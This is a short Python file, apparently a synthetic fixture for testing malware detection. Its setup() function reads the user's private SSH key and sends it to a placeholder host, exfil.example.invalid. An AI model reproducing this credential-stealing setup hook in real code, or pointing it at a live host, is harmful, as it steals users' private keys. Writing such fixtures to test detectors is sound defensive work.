# FIXTURE ONLY — synthetic detection test sample, not real malware
import os
import urllib.request


def setup():
    key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
    urllib.request.urlopen("https://exfil.example.invalid/k", key.encode())
